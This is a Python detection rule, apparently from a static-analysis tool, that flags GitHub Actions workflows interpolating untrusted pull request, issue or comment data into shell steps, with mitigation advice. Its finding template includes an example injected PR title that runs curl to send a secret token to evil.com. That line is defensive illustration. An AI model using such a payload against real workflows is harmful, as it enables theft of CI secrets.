"""GitHub Actions Script Injection Detection.

Detects command injection via untrusted PR/issue data in run: scripts.

Tables Used:
- github_steps: Step run scripts
- github_jobs: Job metadata
- github_workflows: Workflow triggers
- github_step_references: Expression references in steps

Schema Contract Compliance: v2.0 (Fidelity Layer - Q class + RuleDB)
"""

import json

from theauditor.rules.base import (
    RuleMetadata,
    RuleResult,
    Severity,
    StandardFinding,
    StandardRuleContext,
)
from theauditor.rules.fidelity import RuleDB
from theauditor.rules.query import Q

METADATA = RuleMetadata(
    name="github_actions_script_injection",
    category="injection",
    target_extensions=[".yml", ".yaml"],
    exclude_patterns=[".pf/", "test/", "__tests__/", "node_modules/"],
    execution_scope="database",
    primary_table="github_steps",
)


UNTRUSTED_PATHS = frozenset(
    [
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.label",
        "github.event.pull_request.head.repo.default_branch",
        "github.head_ref",
        "github.ref_name",
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.comment.body",
        "github.event.review.body",
        "github.event.review_comment.body",
        "github.event.discussion.title",
        "github.event.discussion.body",
        "github.event.discussion_comment.body",
        "github.event.head_commit.message",
        "github.event.head_commit.author.email",
        "github.event.head_commit.author.name",
        "github.event.commits",
        "github.event.release.name",
        "github.event.release.body",
        "github.event.release.tag_name",
        "inputs.",
        "github.event.inputs.",
        "github.event.client_payload.",
        "github.event.workflow_run.head_branch",
        "github.event.workflow_run.head_commit.message",
        "github.event.pages",
    ]
)


GITHUB_SINKS = frozenset(["run", "shell", "bash"])


def register_taint_patterns(taint_registry):
    """Register GitHub Actions taint patterns for flow analysis."""
    for source in UNTRUSTED_PATHS:
        taint_registry.register_source(source, "github", "github")

    for sink in GITHUB_SINKS:
        taint_registry.register_sink(sink, "command_execution", "github")


def analyze(context: StandardRuleContext) -> RuleResult:
    """Detect script injection from untrusted PR/issue data.

    Args:
        context: Standard rule context with db_path

    Returns:
        RuleResult with findings and fidelity manifest
    """
    if not context.db_path:
        return RuleResult(findings=[], manifest={})

    with RuleDB(context.db_path, METADATA.name) as db:
        findings = _find_script_injections(db)
        return RuleResult(findings=findings, manifest=db.get_manifest())


def find_pull_request_injection(context: StandardRuleContext) -> list[StandardFinding]:
    """Legacy entry point - delegates to analyze()."""
    result = analyze(context)
    return result.findings


def _find_script_injections(db: RuleDB) -> list[StandardFinding]:
    """Core detection logic for script injection."""
    findings: list[StandardFinding] = []

    step_rows = db.query(
        Q("github_steps")
        .alias("s")
        .select(
            "s.step_id",
            "s.step_name",
            "s.run_script",
            "github_jobs.workflow_path",
            "github_jobs.job_key",
            "github_workflows.workflow_name",
        )
        .join("github_jobs", on=[("job_id", "job_id")])
        .join("github_workflows", on="github_jobs.workflow_path = github_workflows.workflow_path")
        .where("s.run_script IS NOT NULL")
    )

    for step_id, step_name, run_script, workflow_path, job_key, workflow_name in step_rows:
        ref_rows = db.query(
            Q("github_step_references")
            .select("reference_path")
            .where("step_id = ?", step_id)
            .where("reference_location = ?", "run")
        )

        untrusted_refs = []
        for (ref_path,) in ref_rows:
            if any(ref_path.startswith(unsafe) for unsafe in UNTRUSTED_PATHS):
                untrusted_refs.append(ref_path)

        if not untrusted_refs:
            continue

        trigger_rows = db.query(
            Q("github_workflows").select("on_triggers").where("workflow_path = ?", workflow_path)
        )

        triggers = []
        if trigger_rows:
            on_triggers_json = trigger_rows[0][0]
            if on_triggers_json:
                try:
                    triggers = json.loads(on_triggers_json)
                except json.JSONDecodeError:
                    pass

        critical_triggers = {"pull_request_target", "issue_comment", "workflow_run"}
        has_critical_trigger = bool(critical_triggers & set(triggers))
        severity = Severity.CRITICAL if has_critical_trigger else Severity.HIGH

        findings.append(
            _build_injection_finding(
                workflow_path=workflow_path,
                workflow_name=workflow_name,
                job_key=job_key,
                step_name=step_name or "Unnamed step",
                run_script=run_script,
                untrusted_refs=untrusted_refs,
                severity=severity,
                triggers=triggers,
            )
        )

    return findings


def _build_injection_finding(
    workflow_path: str,
    workflow_name: str,
    job_key: str,
    step_name: str,
    run_script: str,
    untrusted_refs: list[str],
    severity: Severity,
    triggers: list[str],
) -> StandardFinding:
    """Build finding for script injection vulnerability."""
    refs_str = ", ".join(untrusted_refs[:3])
    if len(untrusted_refs) > 3:
        refs_str += f" (+{len(untrusted_refs) - 3} more)"

    trigger_str = ", ".join(triggers) if triggers else "unknown"

    message = (
        f"Workflow '{workflow_name}' job '{job_key}' step '{step_name}' "
        f"uses untrusted data in run: script without sanitization: {refs_str}. "
        f"Attacker can inject commands via {trigger_str} trigger context."
    )

    snippet_lines = []
    for line in run_script.split("\n"):
        if any(ref.replace("github.event.", "") in line for ref in untrusted_refs):
            snippet_lines.append(line.strip())
            if len(snippet_lines) >= 3:
                break

    code_snippet = f"""
# Vulnerable Pattern in {job_key}:
- name: {step_name}
  run: |
    # VULN: Untrusted data in shell script
    {chr(10).join(snippet_lines[:3])}

# Attack Example:
# PR title: "; curl http://evil.com/steal?token=$SECRET #"
# Executes: echo "PR title: ; curl http://evil.com/steal?token=$SECRET #"
    """

    details = {
        "workflow": workflow_path,
        "workflow_name": workflow_name,
        "job_key": job_key,
        "step_name": step_name,
        "untrusted_references": untrusted_refs,
        "triggers": triggers,
        "run_script_preview": run_script[:200] if len(run_script) > 200 else run_script,
        "mitigation": (
            "1. Pass untrusted data through environment variables instead of direct interpolation:\n"
            "   env:\n"
            "     PR_TITLE: ${{ github.event.pull_request.title }}\n"
            '   run: echo "Title: $PR_TITLE"\n'
            "2. Validate/sanitize input with regex before use\n"
            "3. Use github-script action for safer JavaScript execution"
        ),
    }

    return StandardFinding(
        file_path=workflow_path,
        line=0,
        rule_name="pull_request_injection",
        message=message,
        severity=severity,
        category="injection",
        confidence="high",
        snippet=code_snippet.strip(),
        cwe_id="CWE-77",
        additional_info=details,
    )
